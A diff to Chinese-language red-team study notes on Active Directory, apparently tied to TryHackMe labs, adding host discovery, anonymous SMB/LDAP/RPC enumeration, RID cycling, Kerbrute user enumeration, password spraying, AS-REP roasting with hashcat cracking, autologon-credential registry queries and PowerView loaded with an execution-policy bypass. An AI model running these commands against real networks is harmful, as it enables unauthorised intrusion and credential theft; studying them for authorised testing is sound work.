@@ -4,6 +4,146 @@
 
 在红队演练中，枚举的目标是发现配置错误、识别高权限目标，并最终绘制出可行的攻击路径。这些路径可能用于**权限提升 (Privilege Escalation)** 或**横向移动 (Lateral Movement)**，以获取更多访问权限，直至达成最终目标。枚举与利用通常是紧密交织、循环往复的过程：每次成功的利用都会提供一个新的、权限更高的立足点，攻击者会从该位置再次开始新一轮的枚举。
 
+#### 绘制网络拓扑 (Drawing the Network Topology)
+
+在进行任何深入的枚举之前，首要任务是识别网络中的活动主机，特别是域控制器 (DC)。
+##### 主机发现 (Host Discovery)
+
+- **fping**: 使用 ICMP 请求快速扫描整个子网以发现活动主机。
+    ```
+    # -a: 显示活动主机, -g: 从 CIDR 生成目标, -q: 静默模式
+    fping -agq 10.211.11.0/24
+    ```
+    
+- **Nmap**: 使用 ping 扫描模式 (`-sn`)，这是一种更全面的主机发现方法，因为它会尝试 ARP, ICMP, TCP 和 UDP 探测。
+    ```
+    nmap -sn 10.211.11.0/24
+    ```
+    
+##### 端口扫描 (Port Scanning)
+
+一旦发现活动主机，就需要确定哪些是域控制器。这可以通过扫描常见的 Active Directory 端口来完成。
+
+- **常见 AD 端口**:
+    
+|端口|协议|用途与风险|
+|---|---|---|
+|88|Kerberos|Kerberos 票据攻击 (Kerberoasting 等)|
+|135|MS-RPC|RPC 枚举 (空会话)|
+|139|NetBIOS|传统 SMB 访问，信息收集|
+|389|LDAP|明文 LDAP 查询，枚举 AD 对象|
+|445|SMB|现代 SMB 访问，文件共享，漏洞利用 (EternalBlue)，凭证窃取|
+|464|Kerberos (kpasswd)|密码相关的 Kerberos 服务|
+|636|LDAPS|加密的 LDAP 查询|
+
+- **识别域控制器**: 域控制器通常会同时开放 88, 389, 445 等端口。
+    ```
+    # -p: 指定端口, -sV: 版本检测, -sC: 默认脚本, -iL: 从文件读取目标
+    nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt
+    ```
+    
+
+#### 2服务枚举与利用 (Service Enumeration and Exploitation)
+
+在没有有效凭证的情况下，我们的目标是利用配置不当的服务进行匿名枚举。
+
+##### SMB 枚举
+
+- **列出共享**:
+    - **smbclient**: `smbclient -L //<TARGET_IP> -N` (`-L` 列出共享, `-N` 无密码)
+    - **smbmap**: `smbmap -H <TARGET_IP>` (同时显示共享权限)
+    - **Nmap**: `nmap -p445 --script smb-enum-shares <TARGET_IP>`
+        
+- **访问共享**:
+    ```
+    # -U Anonymous: 指定匿名用户
+    smbclient //<TARGET_IP>/<SHARE_NAME> -U Anonymous -N
+    ```
+    
+    进入共享后，使用 `ls` 查看文件，`get <file>` 下载文件。
+    
+
+##### LDAP 枚举 (匿名绑定)
+
+一些 LDAP 服务器允许匿名用户执行只读查询，这会泄露大量 AD 信息。
+
+```
+# 测试匿名绑定是否启用
+ldapsearch -x -H ldap://<TARGET_IP> -s base
+
+# 如果成功，查询所有用户对象
+ldapsearch -x -H ldap://<TARGET_IP> -b "dc=tryhackme,dc=loc" "(objectClass=person)"
+```
+
+##### RPC 枚举 (空会话)
+
+当 SMB 允许空会话时，未经身份验证的用户可以连接到 `IPC$` 共享并枚举域信息。
+
+```
+# 测试空会话连接
+rpcclient -U "" <TARGET_IP> -N
+
+# 如果成功，枚举域用户
+rpcclient> enumdomusers
+```
+
+##### RID 循环
+
+通过暴力破解 RID (相对标识符) 来发现用户账户，特别是当 `enumdomusers` 等方法被限制时。
+
+```
+for i in $(seq 500 2000); do echo "queryuser $i" | rpcclient -U "" -N <TARGET_IP> 2>/dev/null | grep -i "User Name"; done
+```
+
+#### 用户枚举与密码攻击 (User Enumeration and Password Attacks)
+
+##### 使用 Kerbrute 进行用户名枚举
+
+**Kerbrute** 通过滥用 Kerberos 预认证机制来暴力破解用户名。这种方法不会在 DC 上触发“账户登录失败”的日志，因此非常隐蔽。
+```
+./kerbrute userenum --dc <DC_IP> -d <DOMAIN> users.txt
+```
+
+##### 密码喷洒 (Password Spraying)
+
+密码喷洒是在大量账户上尝试一小组常用密码的攻击技术。
+
+1. **获取密码策略**:
+
+    ```
+    # 使用 rpcclient (需要空会话)
+    rpcclient> getdompwinfo
+    # 使用 CrackMapExec
+    crackmapexec smb <TARGET_IP> --pass-pol
+    ```
+    
+2. **执行攻击**: 根据获取的密码策略（如最小长度、复杂性）构造一个小的密码列表 (`passwords.txt`)，然后使用 **CrackMapExec** 对用户列表 (`users.txt`) 进行喷洒。
+
+    ```
+    crackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt
+    ```
+    
+##### AS-REP Roasting
+
+此攻击利用了被错误配置为**“不需要 Kerberos 预认证”**的用户账户。
+
+1. **枚举易受攻击的账户**:
+    
+    - **Rubeus (Windows)**: `Rubeus.exe asreproast`
+        
+    - **Impacket (Linux)**:
+
+        ```
+        GetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
+        ```
+        
+2. **破解哈希**: 使用 **Hashcat** 对获取的哈希进行离线破解 (模式 `18200`)。
+
+    ```
+    hashcat -m 18200 hashes.txt wordlist.txt
+    ```
+    
+
 #### 准备工作：凭证注入 (Preparation: Credential Injection)
 
 在安全评估中，攻击者控制的机器通常未加入目标域。为了使用已获取的 AD 凭证进行网络认证，需要先将其注入到当前会话的内存中。
@@ -70,14 +210,30 @@
 ##### 通过命令提示符 (Enumeration via Command Prompt, CMD)
 
 - **概述 (Overview)**：使用内置的 `net.exe` 命令是在受限环境（如 RAT 会话或 PowerShell 被严密监控的场景）下进行快速查询的有效手段。
+- **我是谁？ (`whoami`)**:
+    - `whoami`: 显示 `DomainName\UserName` 或 `ComputerName\UserName`。
+    - `whoami /all`: 显示用户的 SID、所有组成员身份和**权限 (Privileges)**。
+    - **高价值权限**: `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege` (可用于 "Potato" 提权攻击), `SeBackupPrivilege` (可读取任意文件), `SeDebugPrivilege` (可调试任意进程，如 `lsass.exe`)。
+- **系统与域信息**:
+	- `hostname`: 显示主机名。
+    - `systeminfo | findstr /B "Domain"`: 快速获取域名。
+    - `set`: 查看环境变量，`USERDOMAIN` 变量会显示域名。
 - **用户枚举 (User Enumeration)**：
     - `net user /domain`：列出域中的所有用户。
     - `net user <username> /domain`：显示特定用户的详细信息，包括组成员身份（有限）、密码策略等。
 - **组枚举 (Group Enumeration)**：
     - `net group /domain`：列出域中的所有组。
+    - `net group "Domain Admins" /domain`: 列出域管组成员。
     - `net group "<groupname>" /domain`：显示特定组的成员。
 - **密码策略枚举 (Password Policy Enumeration)**：
     - `net accounts /domain`：显示域的默认密码策略，如最小密码长度、密码历史、锁定阈值等。这些信息对于规划后续的密码喷洒攻击至关重要。
+- **已登录用户与会话**:
+    - `query user` 或 `quser`: 列出当前登录到该主机的用户（包括 RDP 会话）。
+- **识别服务账户**:
+    - `wmic service get Name,StartName`: 列出所有服务及其运行账户。
+- **注册表与计划任务**:
+    - `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`: 检查是否存在自动登录凭证。
+    - `schtasks /query`: 列出所有计划任务。
 - **优点与缺点 (Pros and Cons)**：
     - **优点**：无需额外工具，通常不被严密监控，易于在宏或钓鱼载荷中脚本化。
     - **缺点**：功能相对有限，例如当用户属于大量组时，可能无法显示所有组成员身份。
@@ -87,9 +243,7 @@
 - **概述 (Overview)**：PowerShell 及其 AD 模块（需要安装 RSAT 工具）提供了比 CMD 强大得多的枚举能力，支持复杂的过滤和对象操作。
 - **核心 Cmdlets**：
     - `Get-ADUser`：枚举用户。`-Properties *` 可显示所有属性，`-Filter` 支持复杂的查询。
-        
-        PowerShell
-        
+
         ```
         # 查找所有姓氏为 "stevens" 的用户
         Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A
@@ -97,9 +251,7 @@
         
     - `Get-ADGroup` / `Get-ADGroupMember`：枚举组及其成员。
     - `Get-ADObject`：通用的对象查询工具，可用于查找满足特定条件的任何对象。
-        
-        PowerShell
-        
+
         ```
         # 查找所有密码错误次数大于 0 的账户，以在密码喷洒中避开它们
         Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
@@ -107,9 +259,42 @@
         
     - `Get-ADDomain`：获取有关域本身的信息。
     - `Set-ADAccountPassword`：修改 AD 对象的示例，可用于重置密码（若有权限）。
+- **使用 PowerView 进行高级枚举**: PowerView 是一款功能极其强大的 PowerShell 枚举工具，是 PowerSploit 框架的一部分。
+
+1. **启动 PowerShell 并绕过执行策略**:
+
+    ```
+    powershell -ep bypass
+    ```
+    
+2. **加载 PowerView 脚本**:
+
+    ```
+    . .\PowerView.ps1
+    ```
+    
+3. **示例命令**:
+
+    ```
+    # 列出所有域用户
+    Get-NetUser | select cn
+    # 查找所有名称中包含 "admin" 的组
+    Get-NetGroup -GroupName *admin*
+    ```
+    
+
+- **命令备忘单**: [HarmJ0y's PowerView Gist](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
 - **优点与缺点 (Pros and Cons)**：
     - **优点**：信息量远超 CMD；支持复杂查询；可远程执行（使用 `-Server` 参数）；功能可扩展；可直接修改对象。
     - **缺点**：PowerShell 活动受到蓝队更严密的监控；需要安装 AD-RSAT 工具或加载外部脚本（如 PowerView），可能被检测。
+
+##### 通过服务器管理器进行枚举
+
+- **概述**: 当通过 RDP 连接到一台服务器时，可以使用内置的 Windows 服务器管理器进行枚举。如果你已是域管理员，将拥有广泛的访问权限。
+    
+- **使用方法**: 在服务器管理器中，导航到 `工具 > Active Directory 用户和计算机`。这里可以查看和管理用户、组、计算机和信任关系。
+    
+    > **提示**: 一些系统管理员可能会在用户账户的描述字段中留下敏感信息，例如服务账户的密码。
 
 ##### 通过 BloodHound (Enumeration via BloodHound)
 
